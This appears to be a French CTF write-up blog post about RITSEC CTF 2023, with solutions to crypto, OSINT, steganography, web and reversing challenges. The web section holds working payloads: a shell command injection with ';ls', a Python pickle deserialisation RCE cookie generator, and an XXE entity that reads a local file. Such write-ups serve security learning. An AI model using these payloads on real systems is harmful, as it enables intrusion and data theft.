---
title: "RITSEC CTF"
date: 2023-04-02
draft: false
---

![Logo|200](/images/ritsec_ctf/d93fffb9c9aa4f834b02e096c3e614cf.png)

56th place / 712 teams

info : https://ctftime.org/event/1860

# Challenge completed
## Crypto
- Either or Neither nor
- A Fine Cipher

## Misc
- New Hire
- Wild Stocks
- Connection Terminated

## Forensics
- Red Team Activity 1
- Red Team Activity 2
- Red Team Activity 3
- Red Team Activity 4

## Steganography
- Weird
- turtle
- QR

## Web
- Echoes
- Rick Roll
- Pickle Store
- X-Men Lore
- Broken Bot

## Reversing
- Cats At Play
- Guess the Password

## Chandi Bot
- Chandi bot 1
- Chandi bot 2
- Chandi bot 3
- Chandi bot 4
- Chandi bot 5
- Chandi bot 6

------------------------------

# Write-ups
## Crypto
### Either or Neither nor
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230403153102.png)

![Le fichier](/images/ritsec_ctf/Pasted%20image%2020230403153254.png)


1.  Le format du drapeau est "MetaCTF{\*}". Les caractères au début du drapeau sont donc "Meta".
    
2.  La longueur de la clé est de 4 octets (KEY_LEN = 4).
    
3.  On connaît les 4 premières valeurs du drapeau chiffré (enc_flag) : [91, 241, 101, 166].
    
4.  Pour récupérer les 4 octets de la clé, on applique l'opération XOR entre les valeurs correspondantes du drapeau chiffré et les caractères "Meta". Par exemple, pour récupérer le premier octet de la clé, on fait 91 (première valeur de enc_flag) XOR 'M' (premier caractère de "Meta").
    
5.  Une fois les 4 octets de la clé trouvés (key = [22, 148, 17, 199]), on peut décrypter le flag en appliquant l'opération XOR entre les valeurs du flag chiffré (enc_flag) et la clé.


``` python
enc_flag = [91, 241, 101, 166, 85, 192, 87, 188, 110, 164, 99, 152, 98, 252, 34, 152, 117, 164, 99, 162, 107] 
known_start = "Meta" # Récupérer les 4 octets de la clé 
key = [] 
for i in range(4): 
	key.append(enc_flag[i] ^ ord(known_start[i])) 
	
# Décrypter le flag 
decrypted_flag = "" 
for i, c in enumerate(enc_flag):
	decrypted_flag += chr(c ^ key[i % len(key)]) 
	
print("Le flag déchiffré est : ", decrypted_flag)
```

``` output
Le flag déchiffré est :  MetaCTF{x0r_th3_c0re}
```

### A Fine Cipher

![Consigne](/images/ritsec_ctf/Pasted%20image%2020230403155045.png)

1.  Analyse de fréquence : Utilisez la distribution de fréquence des lettres dans la langue anglaise pour déterminer la clé en substituant la lettre la plus fréquente par celle la plus fréquente dans le texte crypté. Ensuite, résolvez le système d'équations modulaires pour trouver les valeurs de 'a' et 'b'. Cette méthode peut ne pas fonctionner parfaitement dans tous les cas et implique un certain degré de force brute.

3.  Force brute : Testez les 312 clés possibles en utilisant une approche de force brute pour déterminer la clé.

``` python
def egcd(a, m):  
    if a == 0:  
        return (m, 0, 1)  
    else:  
        g, x, y = egcd(m % a, a)  
        return (g, y - (m // a) * x, x)  
  
def mod_inverse(a, m):  
    g, x, _ = egcd(a, m)  
    if g == 1:  
        return x % m  
  
def affine_decrypt(ciphertext, a, b):  
    plaintext = ""  
    a_inv = mod_inverse(a, 26)  
    if a_inv is None:  
        return None  
    for char in ciphertext:  
        if char.isalpha():  
            offset = ord('A') if char.isupper() else ord('a')  
            plaintext += chr((((ord(char) - offset) * a_inv - b) % 26) + offset)  
        else:  
            plaintext += char  
    return plaintext  
  
def try_all_keys(ciphertext):  
    for a in range(1, 26, 2):  
        for b in range(26):  
            if a in [13, 15, 17, 19, 21, 23, 25]:  
                plaintext = affine_decrypt(ciphertext, a, b)  
                if plaintext is not None:  
                    print(f'a = {a}, b = {b}, texte clair : {plaintext}')  
  
ciphertext = "JSNRZHIVJUCVIVFCVYBMVBDRZCXRIVBINCORBCSFHCBINOCRMHBD"  
try_all_keys(ciphertext)
```
Output
![output](/images/ritsec_ctf/Pasted%20image%2020230403160249.png)

## Misc
### New Hire

![Consigne](/images/ritsec_ctf/Pasted%20image%2020230404103206.png)

![Compétence du linkedin](/images/ritsec_ctf/Pasted%20image%2020230401013450.png)

### Wild Stocks

![Consigne](/images/ritsec_ctf/Pasted%20image%2020230404103231.png)

![Linkedin](/images/ritsec_ctf/Pasted%20image%2020230401013850.png)

![Linkedin](/images/ritsec_ctf/Pasted%20image%2020230401013902.png)

Symbole boursier des entreprises

(R) Ryder System 
(S) SentinelOne Inc 
(SE) Sea Ltd 
(C) Citigroup Inc 
(URI) United Rentals, Inc 
(TY) Tri-Continental Corporation 
(ASA) ASA Gold and Precious Metals Ltd 
(SE) Sea Ltd 
(R) Ryder Systems 
(VICE) AdvisorShares Vice ETF 

RS{SECURITYASASERVICE}

### Connection Terminated

![Consigne](/images/ritsec_ctf/Pasted%20image%2020230404103253.png)

![Hint](/images/ritsec_ctf/Pasted%20image%2020230404103304.png)

*Recherche de la signification RIT*
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230401013555.png)

*Article sur une antenne concernant le RIT*
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230401013650.png)

*Utilisation du site what3words pour retrouver l'antenne et avoir les 3 mots*
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230401013709.png)

///enthusiast.tiptoes.studio => RS{enthusiast.tiptoes.studio}

## Forensics
### Red Team Activity 1
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230404180546.png)

![auth.log](/images/ritsec_ctf/Pasted%20image%2020230404180753.png)

### Red Team Activity 2
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230404180553.png)

![auth.log](/images/ritsec_ctf/Pasted%20image%2020230404180819.png)

### Red Team Activity 3
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230404180609.png)

![auth.log](/images/ritsec_ctf/Pasted%20image%2020230404180919.png)

### Red Team Activity 4
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230404180641.png)

![auth.log](/images/ritsec_ctf/Pasted%20image%2020230404181032.png)

## Steganography
### Wierd
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230404165806.png)

ici a une une image blanche, on utilise l'outil CyberChef

*Randomize colour Palette*
![output](/images/ritsec_ctf/Pasted%20image%2020230404170627.png)

### turtle
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230404165814.png)

ezgif.com Lire les frames d'un gif
![ezgif.com output](/images/ritsec_ctf/Pasted%20image%2020230404173104.png)

### QR
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230404165824.png)

l'image du QRcode que l'ont nous donne
![QR](/images/ritsec_ctf/QR1.png)

Selont les QRcode un certain % de défaut peut etre toléré, j'ai donc utiliser l'outil en ligne merricx pour le reconstruire

![merricx](/images/ritsec_ctf/Pasted%20image%2020230404174035.png)

## Web
### Echoes
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230402235032.png)

Voici a quoi ressemble le site

![site](/images/ritsec_ctf/Pasted%20image%2020230402235057.png)

Il suffit de placer le caractère ";" en input

![site](/images/ritsec_ctf/Pasted%20image%2020230402235642.png)

Avec ";ls"

![output](/images/ritsec_ctf/Pasted%20image%2020230402235706.png)

la vulnérabiliter est une Injection de commande en PHP


*exemple de code PHP vulnérable*
``` php
if (isset($_GET['input'])) {
	$input = $_GET['input']; 
	$command = "echo " . $input; 
	system($command); 
}
```


### Rick Roll
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230403091327.png)

On regarde le code source et l'inspection d'élément

*fichier css dans visible dans le code source*

![site](/images/ritsec_ctf/Pasted%20image%2020230403094257.png)

*autre lien vers un fichier html*

![site](/images/ritsec_ctf/Pasted%20image%2020230403094331.png)

*Don't.html code source*

![site](/images/ritsec_ctf/Pasted%20image%2020230403094905.png)

*fichier css dans visible dans le code source*

![site](/images/ritsec_ctf/Pasted%20image%2020230403092449.png)

*une partie du flag est dans le fichier*

![site](/images/ritsec_ctf/Pasted%20image%2020230403093040.png)

*on regarde si il y a un css 1*

![site](/images/ritsec_ctf/Pasted%20image%2020230403093313.png)

*oui et il y a deux autre partie du flag*

![site](/images/ritsec_ctf/Pasted%20image%2020230403095014.png)
![site](/images/ritsec_ctf/Pasted%20image%2020230403093350.png)

### Pickle Store
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230403095113.png)

*Le site*

![site](/images/ritsec_ctf/Pasted%20image%2020230403095202.png)

*click sur un pickle*

![site](/images/ritsec_ctf/Pasted%20image%2020230403110101.png)

*on remarque que des cookie sont utiliser par le site*
![site](/images/ritsec_ctf/Pasted%20image%2020230403103747.png)

On utilise donc [[Python]] pour créer un cookie qui effectue une RCE

``` python
import pickle  
import base64  
import subprocess  
  
class RCE:  
    def __reduce__(self):  
        cmd = ('ls','-a')
        return subprocess.check_output, (cmd,)  
  
if __name__ == '__main__':  
    pickled = pickle.dumps(RCE())  
    print(base64.urlsafe_b64encode(pickled))
```

``` ouput
b'gASVLwAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5SMAmxzlIwCLWGUhpSFlFKULg=='
```


On enregistre le cookie et refresh la page

*La RCE foncitonne*

![site](/images/ritsec_ctf/Pasted%20image%2020230403105756.png)

*La faille de sécurité du site*

``` python
@app.route('/order')
def order():
    cookie = request.cookies.get("order")
    try:
        data = pickle.loads(b64decode(cookie)) # Execution du code ici
    except:
        return redirect(url_for("index"))
    return render_template("order.html", order=data)
```

1. Ici on a la désérialisation du cookie `pickle.loads(b64decode(cookie))` 

2.  Le code ne vérifie pas si les données du cookie ont été modifiées ou manipulées par l'utilisateur avant de les désérialiser.


### X-Men Lore
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230404180641.png)

![Hint](/images/ritsec_ctf/Pasted%20image%2020230403115255.png)

![Hint](/images/ritsec_ctf/Pasted%20image%2020230403115303.png)

![site](/images/ritsec_ctf/Pasted%20image%2020230403140552.png)

L'application génère une page pour chaque personnage en fonction du cookie de l'utilisateur, qui est une chaîne XML encodée en base64.

**XML External Entity**

``` python
from base64 import b64encode

print(b64encode("<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE input [<!ENTITY flag SYSTEM 'file:///flag'>]><input><xmen>&flag;</xmen></input>".encode("utf-8")))
```

``` output
`b'PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48IURPQ1RZUEUgaW5wdXQgWzwhRU5USVRZIGZsYWcgU1lTVEVNICdmaWxlOi8vL2ZsYWcnPl0+PGlucHV0Pjx4bWVuPiZmbGFnOzwveG1lbj48L2lucHV0Pg=='`
```


![output](/images/ritsec_ctf/Pasted%20image%2020230403143217.png)

### Broken Bot
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230403143532.png)

*la page principale*

![Auth](/images/ritsec_ctf/Pasted%20image%2020230403143554.png)

*Le code source*

![code source](/images/ritsec_ctf/Pasted%20image%2020230403145448.png)

J'utilise l'outil CyberChef pour le code minifier

*on le beautify et on récupère un token de bot telegram*

![cyberchef](/images/ritsec_ctf/Pasted%20image%2020230403152454.png)

il y a un token, celui ci correspond a un bot telegram. Pour récupérer les information on peut utiliser ce site `https://api.telegram.org/botVOTRE_TOKEN/getMe`

*on récupère le nom du bot*

![output](/images/ritsec_ctf/Pasted%20image%2020230403152235.png)

*on a le flag*

![output](/images/ritsec_ctf/Pasted%20image%2020230403152304.png)

## Reversing
### Cats At Play
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230403223454.png)

*ctrl + f*

![file](/images/ritsec_ctf/Pasted%20image%2020230403223445.png)

### Guess the Password 
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230403233339.png)

*le mot de passe est un entier à 8 chiffres*

![file](/images/ritsec_ctf/Pasted%20image%2020230404120608.png)

En jetant un coup d'œil rapide à encoding.py, on dirait `check_input()` hachage `user_input` et vérifie si elle est égale à la clé. `flag_from_pwd()` prend un `key`, xor est contre `secret` et le retourne.

``` python
def flag_from_pwd(self, key):
    byte_secret = self.secret.encode()
    byte_key = key.encode()
    return bytes(a ^ b for a, b in zip(byte_secret, byte_key)).decode()
def check_input(self, user_input):
    hashed_user_input = self.hash(user_input)
    return hashed_user_input == self.hashed_key
```

on vas donc brute force la clé

``` python
from encoding import Encoder
def main():
    encoder = Encoder("supersecret.json")
    # We know the password is 8 digits, so lets generate all possible combinations
    possible_answers = []
    for i in range(100000000):
        possible_answer = str(i)
        possible_answer = "0"*(8-len(possible_answer)) + possible_answer
        possible_answers.append(possible_answer)
    print("Generated possible passwords...\nStarting checks...")
    # now possible_answers is a set that has "00000000", "00000001", ..., "99999999"
    # we can now try brute forcing the flag
    for possible_answer in possible_answers:
        if encoder.check_input(possible_answer):
            print(f"The password is probably: {possible_answer}")
            flag = encoder.flag_from_pwd(possible_answer)
            print(f"That means the flag is something like <RS{ {flag} }>")
            break
    print("Done with checks!")
    # The user could also feed the secret to the server, and it should spit out the flag
if __name__ == "__main__":
    main()
```

``` output
The password is probably: 54744973
```

*server*

![serv](/images/ritsec_ctf/Pasted%20image%2020230404121032.png)


## Chandi Bot
### Chandi bot 1
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230403165203.png)

![bot](/images/ritsec_ctf/Pasted%20image%2020230403165341.png)
### Chandi bot 2
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230403165211.png)

*liste des commandes*

![bot](/images/ritsec_ctf/Pasted%20image%2020230403165640.png)

![bot](/images/ritsec_ctf/Pasted%20image%2020230403165623.png)

### Chandi bot 3
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230403165220.png)

*on donne une image au bot et il nous en redonne une*

![bot](/images/ritsec_ctf/Pasted%20image%2020230401021507.png)

*Utilisation d'outil zsteg*

![bot](/images/ritsec_ctf/Pasted%20image%2020230401021425.png)

### Chandi bot 4
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230403165234.png)

On perd automatiquement mais une mise négatif fonctionne

![bot](/images/ritsec_ctf/Pasted%20image%2020230403221852.png)


### Chandi bot 5
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230403165243.png)

Questionnaire sur l'organisation qui a réaliser ce CTF

### Chandi bot 6
![Consigne](/images/ritsec_ctf/Pasted%20image%2020230403165254.png)

*modif de fichier*

![bot](/images/ritsec_ctf/Pasted%20image%2020230403223122.png)